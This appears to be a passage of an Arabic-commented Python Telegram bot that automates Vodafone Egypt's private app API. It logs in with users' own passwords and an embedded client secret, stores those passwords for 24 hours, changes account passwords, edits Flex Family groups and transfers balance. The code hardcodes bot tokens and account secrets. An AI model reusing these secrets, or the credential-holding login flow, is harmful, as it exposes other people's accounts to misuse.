import telebot
from telebot import types
import sqlite3
import threading
import time
import logging
from datetime import datetime, timedelta
import os
import requests
import json
import re
import base64
import asyncio
import aiohttp
import random
import string
from typing import Dict, List, Optional, Tuple
import uuid

# ==================== الإعدادات الأساسية ====================
USER_BOT_TOKEN = "8817782484:AAGZXVyhCfGyWoS_evaYtzNGaZyKgCbLZHU"
ADMIN_BOT_TOKEN = "8746156510:AAHvZoeIuPA9ddaynEqNlK6NYew8pO-MEnM"
DEV_ID = 8606855463
ASSISTANT_ADMIN_ID = 8606855463
ADMINS = {DEV_ID, ASSISTANT_ADMIN_ID}
DEV_USERNAME = "@jdkfdh"

# ==================== إعدادات نظام الاشتراك المدفوع ====================
SUBSCRIPTION_PRICE = 250          # سعر الاشتراك بالجنيه شهرياً
VODAFONE_CASH_NUMBER = "01010805694"   # رقم فودافون كاش للاستقبال
SUBSCRIPTION_ENABLED = False       # تفعيل/إيقاف نظام الاشتراك (False = مجاني للجميع)

# القنوات المطلوب الاشتراك فيها
CHANNELS = [
    
]

# إعداد التسجيل
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.ERROR
)
logger = logging.getLogger(__name__)

# إنشاء البوتين
user_bot = telebot.TeleBot(USER_BOT_TOKEN)
admin_bot = telebot.TeleBot(ADMIN_BOT_TOKEN)

# ==================== إدارة الجلسات وتجديد التوكن ====================
# تخزين الجلسات مع وقت الانتهاء
user_sessions = {}  # {user_id: {"phone": str, "password": str, "token": str, "bearer_token": str, "login_time": str, "expires_at": datetime}}
# تخزين بيانات التوكن لكل رقم للتجديد التلقائي
phone_tokens = {}  # {phone: {"token": str, "bearer_token": str, "last_refresh": datetime, "expires_at": datetime}}

# ==================== نظام حفظ الباسورد لـ 24 ساعة (تسجيل دخول تلقائي) ====================
# {user_id: {"phone": str, "password": str, "saved_at": datetime, "expires_at": datetime}}
saved_passwords = {}

def save_password_for_user(user_id: int, phone: str, password: str):
    """حفظ بيانات تسجيل الدخول للمستخدم لمدة 24 ساعة"""
    now = datetime.now()
    saved_passwords[user_id] = {
        "phone": phone,
        "password": password,
        "saved_at": now,
        "expires_at": now + timedelta(hours=24)
    }

def get_saved_password(user_id: int) -> Optional[Dict]:
    """جلب البيانات المحفوظة للمستخدم إذا لم تنتهِ صلاحيتها"""
    if user_id not in saved_passwords:
        return None
    data = saved_passwords[user_id]
    if datetime.now() > data.get("expires_at", datetime.min):
        del saved_passwords[user_id]
        return None
    return data

def clear_saved_password(user_id: int):
    """حذف الباسورد المحفوظ عند تسجيل الخروج"""
    if user_id in saved_passwords:
        del saved_passwords[user_id]

def refresh_token_using_old_token(phone: str, old_token: str) -> Optional[Dict]:
    """تجديد التوكن باستخدام التوكن القديم فقط (بدون كلمة المرور)"""
    try:
        # محاولة تجديد التوكن عبر API مختلف
        url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
        
        # طريقة 1: محاولة refresh_token
        headers = {
            'User-Agent': "okhttp/4.12.0",
            'Accept': "application/json, text/plain, */*",
            'Accept-Encoding': "gzip",
            'Content-Type': "application/x-www-form-urlencoded",
            'Authorization': f"Bearer {old_token}"
        }
        
        data = {
            'grant_type': "refresh_token",
            'client_id': "ana-vodafone-app",
            'client_secret': "95fd95fb-7489-4958-8ae6-d31a525cd20a"
        }
        
        response = requests.post(url, data=data, headers=headers, timeout=30)
        
        if response.status_code == 200:
            result = response.json()
            new_token = result.get('access_token')
            if new_token:
                return {
                    "token": new_token,
                    "bearer_token": f"Bearer {new_token}"
                }
        
        # طريقة 2: إعادة استخدام نفس التوكن مع تحديث الطلب (لأن فودافون تقبل التوكن القديم لفترة)
        # نتحقق من صلاحية التوكن أولاً
        test_url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
        test_params = {'@type': "aggregated", 'bucket.product.publicIdentifier': phone}
        test_headers = {
            'Authorization': f"Bearer {old_token}",
            'msisdn': phone,
            'Accept': 'application/json'
        }
        
        test_response = requests.get(test_url, params=test_params, headers=test_headers, timeout=10)
        
        if test_response.status_code == 200:
            # التوكن لا يزال صالحاً
            return {
                "token": old_token,
                "bearer_token": f"Bearer {old_token}"
            }
        
        return None
        
    except Exception:
        return None

def refresh_phone_token_if_needed(phone: str) -> Tuple[bool, Optional[str]]:
    """التحقق من صلاحية توكن الرقم وتجديده إذا لزم الأمر"""
    if phone not in phone_tokens:
        return False, None
    
    token_data = phone_tokens[phone]
    now = datetime.now()
    
    # إذا كان التوكن لا يزال صالحاً (أكثر من 5 دقائق متبقية)
    if token_data.get('expires_at') and token_data['expires_at'] > now + timedelta(minutes=5):
        return True, token_data.get('bearer_token')
    
    # محاولة تجديد التوكن
    old_token = token_data.get('token')
    if not old_token:
        return False, None
    
    new_token_data = refresh_token_using_old_token(phone, old_token)
    
    if new_token_data:
        phone_tokens[phone] = {
            "token": new_token_data['token'],
            "bearer_token": new_token_data['bearer_token'],
            "last_refresh": now,
            "expires_at": now + timedelta(minutes=30)
        }
        return True, new_token_data['bearer_token']
    
    return False, None

def update_session_token(user_id: int, new_bearer_token: str, new_token: str):
    """تحديث التوكن في جلسة المستخدم"""
    if user_id in user_sessions:
        user_sessions[user_id]['token'] = new_token
        user_sessions[user_id]['bearer_token'] = new_bearer_token
        user_sessions[user_id]['expires_at'] = datetime.now() + timedelta(hours=12)
        
        # تحديث في phone_tokens أيضاً
        phone = user_sessions[user_id]['phone']
        if phone in phone_tokens:
            phone_tokens[phone]['token'] = new_token
            phone_tokens[phone]['bearer_token'] = new_bearer_token
            phone_tokens[phone]['last_refresh'] = datetime.now()
            phone_tokens[phone]['expires_at'] = datetime.now() + timedelta(minutes=30)

def check_and_refresh_user_session(user_id: int) -> bool:
    """التحقق من صلاحية جلسة المستخدم وتجديدها إذا لزم الأمر"""
    if user_id not in user_sessions:
        return False
    
    session = user_sessions[user_id]
    
    # التحقق من صلاحية الجلسة (12 ساعة)
    if session.get('expires_at') and session['expires_at'] < datetime.now():
        # انتهت صلاحية الجلسة
        del user_sessions[user_id]
        return False
    
    phone = session['phone']
    success, new_bearer = refresh_phone_token_if_needed(phone)
    
    if success and new_bearer:
        # استخراج التوكن بدون Bearer
        new_token = new_bearer.replace("Bearer ", "")
        update_session_token(user_id, new_bearer, new_token)
        return True
    
    # إذا فشل التجديد، نتحقق من أن التوكن الحالي لا يزال صالحاً
    # عن طريق اختبار بسيط
    try:
        test_url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
        test_params = {'@type': "aggregated", 'bucket.product.publicIdentifier': phone}
        test_headers = {
            'Authorization': session.get('bearer_token', ''),
            'msisdn': phone,
            'Accept': 'application/json'
        }
        test_response = requests.get(test_url, params=test_params, headers=test_headers, timeout=10)
        if test_response.status_code == 200:
            # التوكن لا يزال صالحاً، نحدث وقت الانتهاء
            session['expires_at'] = datetime.now() + timedelta(minutes=25)
            return True
    except:
        pass
    
    return False

def create_session(user_id: int, phone: str, password: str, token: str, bearer_token: str):
    """إنشاء جلسة جديدة للمستخدم"""
    now = datetime.now()
    user_sessions[user_id] = {
        'phone': phone,
        'password': password,
        'token': token,
        'bearer_token': bearer_token,
        'login_time': now.strftime("%Y-%m-%d %H:%M:%S"),
        'expires_at': now + timedelta(hours=12)
    }
    
    # تخزين التوكن للرقم للتجديد التلقائي
    phone_tokens[phone] = {
        "token": token,
        "bearer_token": bearer_token,
        "last_refresh": now,
        "expires_at": now + timedelta(minutes=30)
    }

def get_session_by_phone(phone: str) -> Optional[Dict]:
    """البحث عن جلسة نشطة بواسطة رقم الهاتف"""
    for user_id, session in user_sessions.items():
        if session.get('phone') == phone:
            # التحقق من صلاحية الجلسة
            if session.get('expires_at') and session['expires_at'] > datetime.now():
                return session
            else:
                # حذف الجلسة منتهية الصلاحية
                del user_sessions[user_id]
                return None
    return None

def auto_refresh_all_tokens():
    """دالة تعمل في الخلفية لتجديد التوكنات لكل الأرقام المسجلة"""
    while True:
        try:
            time.sleep(60)  # كل دقيقة نتحقق
            
            now = datetime.now()
            phones_to_refresh = []
            
            # البحث عن الأرقام التي تحتاج تجديد
            for phone, token_data in phone_tokens.items():
                expires_at = token_data.get('expires_at')
                if expires_at and expires_at < now + timedelta(minutes=5):
                    phones_to_refresh.append(phone)
            
            # تجديد التوكنات
            for phone in phones_to_refresh:
                success, new_bearer = refresh_phone_token_if_needed(phone)
                if success and new_bearer:
                    # تحديث الجلسات المرتبطة بهذا الرقم
                    new_token = new_bearer.replace("Bearer ", "")
                    for user_id, session in user_sessions.items():
                        if session.get('phone') == phone:
                            update_session_token(user_id, new_bearer, new_token)
                            
        except Exception as e:
            print(f"خطأ في تجديد التوكنات التلقائي: {e}")

# تشغيل خيط تجديد التوكنات التلقائي
refresh_thread = threading.Thread(target=auto_refresh_all_tokens, daemon=True)
refresh_thread.start()

# ==================== وظائف فودافون الأساسية (المستخدمة في الفاميلي) ====================
def get_authorization(number, password):
    """الحصول على رمز التفويض"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    data = {
        "grant_type": "password",
        "username": number,
        "password": password,
        "client_secret": "95fd95fb-7489-4958-8ae6-d31a525cd20a",
        "client_id": "ana-vodafone-app"
    }
    
    headers = {
        'User-Agent': "okhttp/4.11.0",
        'Accept': "application/json, text/plain, */*",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=30)
        
        if response.status_code == 200:
            tokens = response.json()
            access_token = tokens.get("access_token")
            return {"success": True, "token": access_token, "bearer_token": "Bearer " + access_token}
        else:
            return {"success": False, "message": "الرقم أو كلمة السر غير صحيحة", "status_code": response.status_code}
            
    except requests.exceptions.ConnectionError:
        return {"success": False, "message": "خطأ في الاتصال بالإنترنت"}
    except Exception as e:
        return {"success": False, "message": f"حدث خطأ: {str(e)}"}

def change_password_api(phone, current_password, new_password, token):
    """تغيير كلمة المرور عبر API فودافون"""
    url = "https://mobile.vodafone.com.eg/services/dxl/sam/serviceAccountManagement/v1/serviceAccount"
    
    payload = {
        "customerAccount": {
            "authentication": {
                "newPassword": new_password,
                "password": current_password
            }
        },
        "resources": [
            {
                "IDs": [
                    {
                        "value": phone
                    }
                ],
                "resourceType": "MSISDN"
            }
        ],
        "@type": "userPrefsUpdate"
    }
    
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Connection': "Keep-Alive",
        'Accept': "application/json",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'Authorization': f"Bearer {token}",
        'api-version': "v2",
        'device-id': "70d3004b2bd92694",
        'x-agent-operatingsystem': "11",
        'clientId': "AnaVodafoneAndroid",
        'x-agent-device': "OPPO oppo6779",
        'x-agent-version': "2025.12.1",
        'x-agent-build': "1075",
        'msisdn': phone,
        'Accept-Language': "ar",
        'Content-Type': "application/json; charset=UTF-8"
    }
    
    try:
        response = requests.patch(url, data=json.dumps(payload), headers=headers, timeout=30)
        
        if response.status_code == 200:
            return {"success": True, "message": "✅ تم تغيير كلمة المرور بنجاح!"}
        else:
            return {"success": False, "message": f"❌ فشل تغيير كلمة المرور: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": f"❌ حدث خطأ: {str(e)}"}

def addMember(on, mn, token, value=10):
    """إرسال دعوة"""
    headers = {
        "User-Agent": "okhttp/4.12.0",
    "Connection": "Keep-Alive",
    "Accept": "application/json",
    # "Accept-Encoding": "gzip",
    "Authorization": token,
    "api-version": "v2",
    "device-id": "7be546fe335911d2",
    "x-agent-operatingsystem": "13",
    "clientId": "AnaVodafoneAndroid",
    "x-agent-device": "Samsung SM-A515F",
    "x-agent-version": "2026.2.3",
    "x-agent-build": "1117",
    "msisdn": on,
    "Accept-Language": "ar",
    "Content-Type": "application/json; charset=UTF-8",
    }

    json_data = {
        'name': 'FlexFamily',
        'type': 'SendInvitation',
        'category': [
            {'value': '523', 'listHierarchyId': 'PackageID'},
            {'value': '47', 'listHierarchyId': 'TemplateID'},
            {'value': '523', 'listHierarchyId': 'TierID'},
            {'value': 'percentage', 'listHierarchyId': 'familybehavior'},
        ],
        'parts': {
            'member': [
                {'id': [{'value': on, 'schemeName': 'MSISDN'}], 'type': 'Owner'},
                {'id': [{'value': mn, 'schemeName': 'MSISDN'}], 'type': 'Member'},
            ],
            'characteristicsValue': {
                'characteristicsValue': [
                    {'characteristicName': 'quotaDist1', 'value': value, 'type': 'percentage'},
                ],
            },
        },
    }

    try:
        response = requests.post(
            'https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
            headers=headers,
            json=json_data,
            timeout=30
        )
        if str(response.status_code) in ['200', '201', '{}', '555']:
            return {"success": True, "message": f"تم إرسال الدعوة بنجاح - النسبة: {value}%"}
        else:
            return {"success": False, "message": f"فشل إرسال الدعوة: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": f"حدث خطأ: {str(e)}"}

def accept_invitation(owner_num, member_num, token):
    """قبول دعوة"""
    url = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
    headers = {
        "User-Agent": "okhttp/4.12.0",
    "Connection": "Keep-Alive",
    "Accept": "application/json",
    # "Accept-Encoding": "gzip",
    "api_id": "APP",
    "Authorization": token,
    "api-version": "v2",
    "device-id": "7be546fe335911d2",
    "x-agent-operatingsystem": "13",
    "clientId": "AnaVodafoneAndroid",
    "x-agent-device": "Samsung SM-A515F",
    "x-agent-version": "2026.2.3",
    "x-agent-build": "1117",
    "msisdn": member_num,
    "Accept-Language": "ar",
    "Content-Type": "application/json; charset=UTF-8",
    }
    data = {
        "category": [{"listHierarchyId": "TemplateID", "value": "47"}],
        "name": "FlexFamily",
        "parts": {
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": owner_num}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": member_num}], "type": "Member"}
            ]
        },
        "type": "AcceptInvitation"
    }
    try:
        aa = requests.patch(url, headers=headers, json=data, timeout=30)
        Accept = aa.text
        if str(Accept) in ['{}', '201', '200']:
            return {"success": True, "message": "تم قبول الدعوة بنجاح"}
        elif "Customer not eligible-Family member" in str(Accept):
            return {"success": True, "message": "الرقم موجود بالفعل في عائلة"}
        else:
            return {"success": False, "message": f"خطأ في قبول الدعوة: {Accept[:100]}"}
    except Exception as e:
        return {"success": False, "message": f"حدث خطأ: {str(e)}"}

def remove_member(owner_num, token, member_num):
    """حذف عضو من العائلة"""
    try:
        headers = {
            "User-Agent": "okhttp/4.12.0",
    "Connection": "Keep-Alive",
    "Accept": "application/json",
    # "Accept-Encoding": "gzip",
    "Authorization": token,
    "api-version": "v2",
    "device-id": "7be546fe335911d2",
    "x-agent-operatingsystem": "13",
    "clientId": "AnaVodafoneAndroid",
    "x-agent-device": "Samsung SM-A515F",
    "x-agent-version": "2026.2.3",
    "x-agent-build": "1117",
    "msisdn": owner_num,
    "Accept-Language": "ar",
    "Content-Type": "application/json; charset=UTF-8",
        }

        payload = {
            "name": "FlexFamily",
            "type": "FamilyRemoveMember",
            "category": [{"value": "47", "listHierarchyId": "TemplateID"}],
            "parts": {
                "member": [
                    {"id": [{"value": owner_num, "schemeName": "MSISDN"}], "type": "Owner"},
                    {"id": [{"value": member_num, "schemeName": "MSISDN"}], "type": "Member"}
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "Disconnect", "value": "0"},
                        {"characteristicName": "LastMemberDeletion", "value": "1"}
                    ]
                }
            }
        }
        
        response = requests.patch(
            'https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
            headers=headers,
            json=payload,
            timeout=30
        )
        
        if response.status_code in [200, 201]:
            return {"success": True, "message": "✅ تم حذف العضو بنجاح"}
        else:
            return {"success": False, "message": f"❌ فشل في الحذف: {response.text[:100]}"}
            
    except Exception as e:
        return {"success": False, "message": f"❌ حدث خطأ: {str(e)}"}

def change_quota(owner_num, token, member_num, quota):
    """تغيير نسبة الفرد"""
    try:
        headers = {
           "User-Agent": "okhttp/4.12.0",
    "Connection": "Keep-Alive",
    "Accept": "application/json",
    # "Accept-Encoding": "gzip",
    "Authorization": token,
    "api-version": "v2",
    "device-id": "7be546fe335911d2",
    "x-agent-operatingsystem": "13",
    "clientId": "AnaVodafoneAndroid",
    "x-agent-device": "Samsung SM-A515F",
    "x-agent-version": "2026.2.3",
    "x-agent-build": "1117",
    "msisdn": owner_num,
    "Accept-Language": "ar",
    "Content-Type": "application/json; charset=UTF-8",
        }
        
        payload = {
            "name": "FlexFamily",
            "type": "QuotaRedistribution",
            "category": [
                {"value": "523", "listHierarchyId": "PackageID"},
                {"value": "47", "listHierarchyId": "TemplateID"},
                {"value": "523", "listHierarchyId": "TierID"},
                {"value": "percentage", "listHierarchyId": "familybehavior"}
            ],
            "parts": {
                "member": [
                    {"id": [{"value": owner_num, "schemeName": "MSISDN"}], "type": "Owner"},
                    {"id": [{"value": member_num, "schemeName": "MSISDN"}], "type": "Member"}
                ],
                "characteristicsValue": {
                    "characteristicsValue": [
                        {"characteristicName": "quotaDist1", "value": str(quota), "type": "percentage"}
                    ]
                }
            }
        }
        
        response = requests.patch(
            'https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup',
            headers=headers,
            json=payload,
            timeout=30
        )
        
        if response.status_code in [200, 201, 204]:
            return {"success": True, "message": f"✅ تم تغيير النسبة إلى {quota}% بنجاح"}
        else:
            return {"success": False, "message": f"❌ فشل تغيير النسبة: {response.status_code}"}
            
    except Exception as e:
        return {"success": False, "message": f"❌ حدث خطأ: {str(e)}"}

def get_owner_flex(token, owner_number):
    """الحصول على نسبة فليكس الأونر"""
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'EN',
        'Authorization': token,
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Referer': 'https://web.vodafone.com.eg/spa/familySharing',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        'clientId': 'WebsiteConsumer',
        'msisdn': owner_number,
    }

    try:
        response = requests.get(
            f'https://web.vodafone.com.eg/services/dxl/usage/usageConsumptionReport?bucket.product.publicIdentifier={owner_number}&@type=aggregated',
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 200:
            data = response.json()
            for item in data:
                if item.get("@type") == "OTHERS":
                    for bucket in item.get("bucket", []):
                        if bucket.get("usageType") == "limit":
                            for balance in bucket.get("bucketBalance", []):
                                if balance.get("@type") == "Remaining" and balance["remainingValue"]["units"] == "FLEX":
                                    flex_amount = balance["remainingValue"]["amount"]
                                    return {"success": True, "flex": flex_amount}
            return {"success": False, "message": "لم يتم العثور على رصيد فليكس"}
        else:
            return {"success": False, "message": f"فشل الاستعلام: {response.status_code}"}
    except Exception as e:
        return {"success": False, "message": f"خطأ: {str(e)}"}

def get_owner_number(member_num, token):
    """الحصول على رقم الأونر من رقم الفرد"""
    try:
        headers = {
            'Accept': 'application/json',
            'Accept-Language': 'EN',
            'Authorization': token,
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Referer': 'https://web.vodafone.com.eg/spa/familySharing/manageFamily',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'clientId': 'WebsiteConsumer',
            'msisdn': member_num,
        }

        response = requests.get(
            'https://web.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup?type=Family&$.parts.member.type=member',
            headers=headers,
            timeout=30
        )

        if response.status_code != 200:
            return {"success": False, "message": f"فشل في جلب البيانات: {response.status_code}"}

        data = response.json()
        items = data if isinstance(data, list) else [data]
        
        for item in items:
            parts = item.get("parts", {}) or {}
            members = parts.get("member", []) or []
            for m in members:
                if m.get("type") == "Owner":
                    msisdn = None
                    id_list = m.get("id", [])
                    if isinstance(id_list, list) and id_list:
                        msisdn = id_list[0].get("value")
                    if msisdn:
                        return {"success": True, "owner": msisdn}
        
        return {"success": False, "message": "لم يتم العثور على الأونر"}
        
    except Exception as e:
        return {"success": False, "message": f"حدث خطأ: {str(e)}"}

# ==================== وظائف تحويل الفليكسات ====================
def transfer_flex(token, sender_phone, receiver_phone, amount):
    """تحويل الفليكسات"""
    
    url = "https://mobile.vodafone.com.eg/services/dxl/pbm/prepayBalanceManagement/v4/transferBalance"
    
    headers = {
        "Authorization": f"Bearer {token}",
        "api-version": "v2",
        "device-id": "0df2e7f69ea37dd8",
        "x-agent-operatingsystem": "15",
        "clientId": "AnaVodafoneAndroid",
        "msisdn": sender_phone,
        "Accept": "application/json",
        "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8",
        "Host": "mobile.vodafone.com.eg",
        "User-Agent": "okhttp/4.12.0"
    }
    
    payload = {
        "amount": {"amount": str(amount)},
        "bucket": {"id": sender_phone},
        "receiver": {"id": receiver_phone},
        "@type": "flexTransfer"
    }
    
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=20)
        
        if response.status_code == 200:
            return True, "تم تحويل الفليكسات بنجاح ✅"
        else:
            try:
                error_data = response.json()
                return False, error_data
            except:
                return False, response.text
                
    except Exception as e:
        return False, str(e)

# ==================== وظائف من ملف تفعيل الخط بالكامل ====================
def login_balance(msisdn, password):
    """تسجيل الدخول والحصول على التوكنات"""
    url = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
    
    payload = f'grant_type=password&username={msisdn}&password={password}&client_secret=95fd95fb-7489-4958-8ae6-d31a525cd20a&client_id=ana-vodafone-app'
    
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip',
        'silentLogin': 'true',
        'x-agent-operatingsystem': '15',
        'clientId': 'AnaVodafoneAndroid',
        'Accept-Language': 'ar',
        'x-agent-device': 'INFINIX Infinix X6725',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'digitalId': '25WM5Q6BRBXF3',
        'device-id': '0df2e7f69ea37dd8',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            return {
                'success': True,
                'access_token': data.get('access_token'),
                'full_response': data
            }
        else:
            return {
                'success': False,
                'error': f'Status Code: {response.status_code}',
                'details': response.text,
                'status_code': response.status_code
            }
    except Exception as e:
        return {
            'success': False,
            'error': f'خطأ في الاتصال: {e}'
        }

def decode_jwt_safe(token):
    """فك تشفير JWT بأمان مع دعم جميع الأنظمة"""
    try:
        parts = token.split('.')
        
        if len(parts) != 3:
            return None
        
        payload = parts[1]
        
        padding_needed = 4 - (len(payload) % 4)
        if padding_needed != 4:
            payload += '=' * padding_needed
        
        decoded_bytes = base64.b64decode(payload)
        decoded_json = json.loads(decoded_bytes)
        
        return decoded_json
        
    except Exception as e:
        return None

def detect_system_type(decoded_token):
    """تحديد نوع النظام بناءً على التوكن"""
    if not decoded_token:
        return "غير معروف"
    
    user_info = decoded_token.get('userInfo', {})
    contract_sub_type = user_info.get('contractSubType', '')
    service_class_name = user_info.get('serviceClassName', '')
    contract_type = user_info.get('contractType', '')
    
    if 'Flex_Family_2021' in contract_sub_type or 'Flex' in service_class_name:
        return "نظام 2021 (Flex)"
    elif '2024' in contract_sub_type or '2024' in service_class_name:
        return "نظام 2024"
    elif '2025' in contract_sub_type or '2025' in service_class_name:
        return "نظام 2025"
    elif 'Legacy' in contract_sub_type or '2015' in contract_sub_type:
        return "نظام 2015 (Legacy)"
    elif contract_type == 'PREPAID' and not contract_sub_type:
        return "نظام 2015 (PREPAID عادي)"
    else:
        return "نظام غير محدد"

def get_moneyback_balance(access_token, msisdn):
    """جلب رصيد MoneyBack"""
    url = "https://mobile.vodafone.com.eg/services/dxl/usage/usageConsumptionReport"
    
    params = {
        '@type': "aggregated",
        'bucket.product.publicIdentifier': msisdn
    }
    
    headers = {
        'User-Agent': 'okhttp/4.12.0',
        'Connection': 'Keep-Alive',
        'Accept': 'application/json',
        'Accept-Encoding': 'gzip',
        'api-host': 'usageConsumptionHost',
        'useCase': 'aggregated',
        'Authorization': f'Bearer {access_token}',
        'api-version': 'v2',
        'device-id': '0df2e7f69ea37dd8',
        'x-agent-operatingsystem': '15',
        'clientId': 'AnaVodafoneAndroid',
        'x-agent-device': 'INFINIX Infinix X6725',
        'x-agent-version': '2025.11.1',
        'x-agent-build': '1063',
        'msisdn': msisdn,
        'Content-Type': 'application/json',
        'Accept-Language': 'ar'
    }
    
    try:
        response = requests.get(url, params=params, headers=headers, timeout=30)
        
        if response.status_code == 200:
            data = response.json()
            
            moneyback = None
            
            def search_moneyback(obj, depth=0):
                nonlocal moneyback
                if moneyback is not None:
                    return
                    
                if isinstance(obj, dict):
                    for key, value in obj.items():
                        if key == 'bucketBalance' and isinstance(value, list):
                            for item in value:
                                if isinstance(item, dict) and 'remainingValue' in item:
                                    remaining = item['remainingValue']
                                    if isinstance(remaining, dict) and 'amount' in remaining:
                                        amt = remaining['amount']
                                        if isinstance(amt, (int, float)) and 0 < amt < 2000:
                                            excluded_values = [751, 4300, 5233, 17, 437, 1, 2000, 4950, 245, 92799]
                                            if amt not in excluded_values:
                                                moneyback = amt
                                                return
                        if moneyback is None:
                            search_moneyback(value, depth+1)
                elif isinstance(obj, list):
                    for item in obj:
                        if moneyback is None:
                            search_moneyback(item, depth+1)
            
            search_moneyback(data)
            
            if moneyback is None:
                def find_any_balance(obj):
                    nonlocal moneyback
                    if isinstance(obj, dict):
                        for key, value in obj.items():
                            if 'balance' in key.lower() or 'amount' in key.lower():
                                if isinstance(value, (int, float)) and 0 < value < 2000:
                                    moneyback = value
                                    return
                            find_any_balance(value)
                    elif isinstance(obj, list):
                        for item in obj:
                            find_any_balance(item)
                
                find_any_balance(data)
            
            return {
                'success': True,
                'moneyback': moneyback,
                'raw_data': data
            }
        else:
            return {
                'success': False,
                'error': f'Status Code: {response.status_code}',
                'details': response.text[:200]
            }
    except Exception as e:
        return {
            'success': False,
            'error': f'خطأ: {e}'
        }

def display_user_info_text(decoded_token, system_type, msisdn):
    """توليد نص معلومات المستخدم"""
    if not decoded_token:
        return "⚠️ لا توجد معلومات متاحة"
    
    user_info = decoded_token.get('userInfo', {})
    
    result = "👤 معلومات المستخدم\n" + "="*40 + "\n\n"
    result += f"📞 رقم الهاتف: {user_info.get('msisdn', msisdn)}\n"
    result += f"👤 الاسم: {user_info.get('firstName', 'غير متوفر')} {user_info.get('lastName', '')}\n"
    result += f"📧 البريد الإلكتروني: {user_info.get('email', 'غير متوفر')}\n"
    result += f"🆔 معرف العميل: {user_info.get('customerID', 'غير متوفر')}\n"
    result += f"💳 رقم الحساب: {user_info.get('accountNumber', user_info.get('largeBillingAccount', 'غير متوفر'))}\n"
    
    result += "\n📦 معلومات الباقة:\n"
    
    if system_type == "نظام 2021 (Flex)":
        result += f"   🏷️ نوع الباقة: {user_info.get('serviceClassName', 'غير متوفر')}\n"
        result += f"   📝 نوع العقد: {user_info.get('contractSubType', 'غير متوفر')}\n"
        result += f"   📊 شريحة القيمة: {user_info.get('segmentValue', 'غير متوفر')}\n"
        result += f"   💰 نوع الدفع: {user_info.get('customerType', 'غير متوفر')}\n"
        result += f"   📅 دورة الفاتورة: {user_info.get('billCycleDate', 'غير متوفر')}\n"
        
    elif system_type in ["نظام 2024", "نظام 2025"]:
        result += f"   🏷️ نوع الباقة: {user_info.get('serviceClassName', 'غير متوفر')}\n"
        result += f"   ✨ ميزات إضافية: {user_info.get('features', 'غير متوفر')}\n"
        result += f"   🎯 خطة محدثة: {user_info.get('updatedPlan', 'غير متوفر')}\n"
        result += f"   💰 نوع الدفع: {user_info.get('customerType', 'غير متوفر')}\n"
        
    elif system_type == "نظام 2015 (Legacy)":
        result += f"   🏷️ نوع الخدمة: {user_info.get('serviceType', 'خدمة صوتية')}\n"
        result += f"   💰 نوع الدفع: {user_info.get('paymentType', 'مسبق الدفع')}\n"
        result += f"   📅 تاريخ التفعيل: {user_info.get('activationDate', 'غير متوفر')}\n"
    else:
        if user_info.get('serviceClassName'):
            result += f"   🏷️ نوع الباقة: {user_info.get('serviceClassName')}\n"
        if user_info.get('contractSubType'):
            result += f"   📝 نوع العقد: {user_info.get('contractSubType')}\n"
        if user_info.get('customerType'):
            result += f"   💰 نوع الدفع: {user_info.get('customerType')}\n"
    
    result += f"\n📌 معلومات إضافية:\n"
    if user_info.get('lineType'):
        result += f"   📱 نوع الخط: {user_info.get('lineType')}\n"
    if user_info.get('contractStatus'):
        result += f"   ✅ حالة العقد: {user_info.get('contractStatus')}\n"
    if user_info.get('priceGroupType'):
        result += f"   🏢 مجموعة السعر: {user_info.get('priceGroupType')}\n"
    
    # الصلاحيات
    authorities = user_info.get('authorities', [])
    if authorities:
        result += f"\n🔐 الصلاحيات المتاحة:\n"
        for authority in authorities:
            if authority.startswith('ROLE_'):
                role_name = authority.replace('ROLE_', '').replace('_', ' ').title()
                result += f"   ✅ {role_name}\n"
            else:
                result += f"   ✅ {authority}\n"
    else:
        result += f"\n🔐 الصلاحيات المتاحة:\n   ⚠️ لا توجد صلاحيات محددة\n"
    
    return result

def display_moneyback_text(moneyback):
    """توليد نص رصيد MoneyBack"""
    if moneyback is not None and moneyback > 0:
        return f"💰 رصيد MoneyBack\n{'='*40}\n\n💰 الرصيد المتاح: {int(moneyback)} جنيه\n\n💡 قيمة الرصيد: {int(moneyback)} جنيه\n\n✨ يمكن استخدام الرصيد لـ:\n   • باقات إنترنت إضافية\n   • دقائق مكالمات\n   • رسائل SMS\n   • خصومات على الفواتير\n   • عروض حصرية"
    else:
